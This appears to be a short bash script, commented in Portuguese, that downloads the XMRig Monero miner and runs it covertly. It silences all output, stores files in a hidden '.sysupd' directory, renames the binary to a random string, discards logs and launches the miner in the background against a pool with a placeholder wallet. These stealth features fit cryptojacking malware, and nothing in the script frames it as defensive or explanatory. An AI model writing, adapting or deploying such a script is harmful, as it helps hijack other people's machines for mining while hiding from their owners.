#!/bin/bash

# === CONFIGURAÇÃO ===
WALLET="SEU_ENDERECO_MONERO_AQUI"  # coloque aqui sua wallet Monero
POOL="xmr-eu1.nanopool.org:14433"
WORKER=$(hostname)-$(date +%s)
RAND_BIN=$(tr -dc a-z0-9 </dev/urandom | head -c 8)

# Silencia saída
exec >/dev/null 2>&1

# Atualiza sistema e instala dependências
sudo apt update -y
sudo apt install -y wget tar

# Cria diretório oculto
mkdir -p ~/.sysupd/.core
cd ~/.sysupd/.core

# Baixa e extrai XMRig
wget https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-x64.tar.gz -O core.tar.gz
tar -xf core.tar.gz
cd xmrig-*-linux-x64

# Renomeia o binário pra nome aleatório
mv xmrig $RAND_BIN
chmod +x $RAND_BIN

# Executa minerador em background com TLS e prioridade baixa
nohup ./$RAND_BIN -o $POOL -u $WALLET -k --tls --donate-level=0 \
  --cpu-priority=5 --log-file=/dev/null --user-agent="$WORKER" > /dev/null 2>&1 &
